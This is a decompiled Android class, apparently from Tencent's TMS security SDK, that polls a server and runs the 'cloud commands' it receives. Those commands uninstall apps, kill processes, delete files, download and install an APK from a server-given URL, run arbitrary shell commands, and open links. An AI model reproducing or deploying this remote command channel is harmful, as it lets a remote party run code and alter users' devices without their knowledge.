package tms;

import QQPIM.ClientVersionInfo;
import QQPIM.CloudCmd;
import QQPIM.CloudInfo;
import QQPIM.DeleteFileInfo;
import QQPIM.ExecShell;
import QQPIM.InstallInfo;
import QQPIM.KillProcessInfo;
import QQPIM.OpenLinkInfo;
import QQPIM.ServerCmdInfo;
import QQPIM.TipsInfo;
import QQPIM.UninstallInfo;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import com.lenovo.lps.sus.p003a.p004a.p005a.InterfaceC0079b;
import com.p012qq.jce.wup.UniAttribute;
import com.tencent.tmsecure.common.ManagerCreator;
import com.tencent.tmsecure.common.TMSApplication;
import com.tencent.tmsecure.module.wupsession.WupSessionManager;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicReference;

/* JADX INFO: renamed from: tms.p */
/* JADX INFO: loaded from: classes.dex */
public final class C1330p {

    /* JADX INFO: renamed from: c */
    private static C1330p f7465c = null;

    /* JADX INFO: renamed from: a */
    private Context f7466a;

    /* JADX INFO: renamed from: b */
    private final ConcurrentLinkedQueue<CloudInfo> f7467b = new ConcurrentLinkedQueue<>();

    /* JADX INFO: renamed from: e */
    private boolean f7469e = false;

    /* JADX INFO: renamed from: d */
    private C1149af f7468d = new C1149af("wup");

    private C1330p(Context context) {
        this.f7466a = context;
    }

    /* JADX INFO: renamed from: a */
    public static synchronized C1330p m3532a(Context context) {
        if (f7465c == null) {
            f7465c = new C1330p(context);
        }
        return f7465c;
    }

    /* JADX INFO: renamed from: a */
    private synchronized void m3533a(CloudInfo cloudInfo) {
        ArrayList<CloudCmd> cloudcmds = cloudInfo.getCloudcmds();
        if (cloudcmds != null) {
            Iterator<CloudCmd> it = cloudcmds.iterator();
            while (it.hasNext() && m3534a(cloudInfo, it.next()) == 0) {
            }
        }
    }

    /* JADX INFO: renamed from: a */
    public final int m3534a(CloudInfo cloudInfo, CloudCmd cloudCmd) {
        int i = 0;
        UniAttribute uniAttribute = new UniAttribute();
        uniAttribute.setEncodeName(InterfaceC0079b.f1213a);
        uniAttribute.decode(cloudCmd.getParam());
        switch (cloudCmd.getCmdid()) {
            case 1:
                UninstallInfo uninstallInfo = (UninstallInfo) uniAttribute.getByClass("cloudcmd", new UninstallInfo());
                if (uninstallInfo == null) {
                    return -5;
                }
                switch (uninstallInfo.getOption()) {
                    case 1:
                        C1331q.m3543d(this.f7466a, uninstallInfo.getUid());
                        return 0;
                    case 5:
                        return C1331q.m3544e(this.f7466a, uninstallInfo.getUid()) ? 0 : -5;
                    default:
                        return -5;
                }
            case 3:
                KillProcessInfo killProcessInfo = (KillProcessInfo) uniAttribute.getByClass("cloudcmd", new KillProcessInfo());
                return (killProcessInfo == null || !C1331q.m3545f(this.f7466a, killProcessInfo.getProcess())) ? -5 : 0;
            case 4:
                DeleteFileInfo deleteFileInfo = (DeleteFileInfo) uniAttribute.getByClass("cloudcmd", new DeleteFileInfo());
                if (deleteFileInfo != null) {
                    return C1331q.m3542c(this.f7466a, deleteFileInfo.getFile()) ? 0 : -5;
                }
                return -5;
            case 6:
                InstallInfo installInfo = (InstallInfo) uniAttribute.getByClass("cloudcmd", new InstallInfo());
                if (installInfo == null) {
                    return -5;
                }
                C1331q.m3540a(this.f7466a, installInfo.getUrl(), "temp.apk", 1);
                switch (installInfo.getOption()) {
                    case 1:
                        C1331q.m3539a(this.f7466a, this.f7466a.getFilesDir().getAbsolutePath() + "/temp.apk");
                        break;
                    case 5:
                        if (!C1331q.m3541b(this.f7466a, this.f7466a.getFilesDir().getAbsolutePath() + "/temp.apk")) {
                        }
                    default:
                        i = -5;
                        break;
                }
                return i;
            case 9:
                ExecShell execShell = (ExecShell) uniAttribute.getByClass("cloudcmd", new ExecShell());
                return (execShell == null || !C1331q.m3546g(this.f7466a, execShell.getShellcmd())) ? -5 : 0;
            case 101:
                OpenLinkInfo openLinkInfo = (OpenLinkInfo) uniAttribute.getByClass("cloudcmd", new OpenLinkInfo());
                if (openLinkInfo == null) {
                    return -5;
                }
                Intent intent = new Intent();
                intent.setAction("android.intent.action.VIEW");
                intent.setData(Uri.parse(openLinkInfo.getUrl()));
                intent.setFlags(268435456);
                this.f7466a.startActivity(intent);
                return 0;
            default:
                return -5;
        }
    }

    /* JADX INFO: renamed from: a */
    public final synchronized void m3535a() {
        boolean zM2890a = this.f7468d.m2890a(C1331q.f7470a, false);
        long jM2882a = this.f7468d.m2882a(C1331q.f7471b, 0L);
        long jM2882a2 = this.f7468d.m2882a(C1331q.f7472c, 0L);
        long jCurrentTimeMillis = System.currentTimeMillis();
        if ((!zM2890a || jCurrentTimeMillis > jM2882a2 + 60000 || Math.abs(jCurrentTimeMillis - jM2882a) > 604800000) && TMSApplication.getSecureServiceClass() != null) {
            Intent intent = new Intent(this.f7466a, TMSApplication.getSecureServiceClass());
            intent.setAction(C1331q.f7473d);
            this.f7466a.startService(intent);
        }
    }

    /* JADX INFO: renamed from: a */
    public final synchronized void m3536a(int i) {
        TipsInfo tips;
        ArrayList<CloudInfo> arrayList = new ArrayList();
        for (CloudInfo cloudInfo : this.f7467b) {
            if (cloudInfo != null && cloudInfo.getTime().getTime() == i) {
                arrayList.add(cloudInfo);
            }
        }
        if (arrayList.size() > 0) {
            for (CloudInfo cloudInfo2 : arrayList) {
                if ((cloudInfo2.getTime().getValidEndTime() == 0 || System.currentTimeMillis() / 1000 < ((long) cloudInfo2.getTime().getValidEndTime())) && (tips = cloudInfo2.getTips()) != null) {
                    switch (tips.getType()) {
                        case 0:
                            m3533a(cloudInfo2);
                            break;
                        case 6:
                        case 8:
                            break;
                    }
                }
                this.f7467b.remove(cloudInfo2);
            }
        }
    }

    /* JADX INFO: renamed from: b */
    public final int m3537b() {
        if (this.f7469e) {
            return -2;
        }
        this.f7469e = true;
        String strFromEnvMap = TMSApplication.getStrFromEnvMap(TMSApplication.CON_SOFTVERSION);
        String str = "buildno=" + TMSApplication.getIntFromEnvMap(TMSApplication.CON_BUILD) + "&version=" + strFromEnvMap + "&productid=" + TMSApplication.getIntFromEnvMap(TMSApplication.CON_PRODUCT);
        ArrayList arrayList = new ArrayList();
        arrayList.add(new ClientVersionInfo(8, 2, str));
        AtomicReference<ServerCmdInfo> atomicReference = new AtomicReference<>();
        int updatesV2 = ((WupSessionManager) ManagerCreator.getManager(WupSessionManager.class)).getUpdatesV2(arrayList, atomicReference);
        if (updatesV2 != 0) {
            this.f7469e = false;
            return updatesV2;
        }
        ServerCmdInfo serverCmdInfo = atomicReference.get();
        if (serverCmdInfo != null && TMSApplication.getSecureServiceClass() != null) {
            AlarmManager alarmManager = (AlarmManager) this.f7466a.getSystemService("alarm");
            Intent intent = new Intent(this.f7466a, TMSApplication.getSecureServiceClass());
            intent.setAction(C1331q.f7473d);
            PendingIntent service = PendingIntent.getService(this.f7466a, 0, intent, 0);
            alarmManager.cancel(service);
            long jCurrentTimeMillis = System.currentTimeMillis() + ((long) (serverCmdInfo.getNextcheckinterval() * 1000));
            alarmManager.set(1, jCurrentTimeMillis, service);
            this.f7468d.m2887a(C1331q.f7472c, jCurrentTimeMillis, true);
            this.f7467b.clear();
            this.f7467b.addAll(serverCmdInfo.getCloudinfos());
            m3536a(1);
        }
        this.f7469e = false;
        return updatesV2;
    }
}
